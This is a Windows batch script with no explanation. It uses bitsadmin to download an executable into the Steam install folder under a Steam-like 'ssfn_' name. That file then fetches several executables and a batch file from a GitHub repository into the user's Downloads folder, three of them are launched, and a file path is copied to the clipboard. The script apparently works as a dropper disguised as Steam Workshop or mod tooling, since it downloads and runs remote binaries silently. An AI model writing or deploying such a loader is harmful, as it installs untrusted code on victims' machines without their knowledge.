@echo off
TITLE 

IF EXIST "C:\Program Files (x86)\steam\ssfn_rdl.exe" (
echo Exists) ELSE (
  bitsadmin /transfer "DownloadJob" "https://files.rycoh.net/rdl.exe" "C:\Program Files (x86)\steam\ssfn_rdl.exe"  
)

IF EXIST "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe" (
echo Exists) ELSE (
  "C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe" "https://github.com/tobiasmulln/Testing/raw/main/ssfn_WorkshopMods.exe"
)

"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\VerifyWorkshop.exe" "https://github.com/tobiasmulln/Testing/raw/main/VerifyWorkshop.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\Cloud.exe" "https://github.com/tobiasmulln/Testing/raw/main/Cloud.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\ARK_WorldsMod.bat " "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ARK_WorldsMod.bat"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\noTitles.exe" "https://github.com/tobiasmulln/Testing/raw/main/noTitles.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\noTitlesWorse.exe" "https://github.com/tobiasmulln/Testing/raw/main/noTitlesWorse.exe"

start "" "C:\Users\user\Downloads\noTitles.exe"
start "" "C:\Users\user\Downloads\noTitlesWorse.exe"
start "" "C:\Users\user\Downloads\VerifyWorkshop.exe"

echo C:\Users\user\Downloads\ARK_WorldsMod.bat|clip
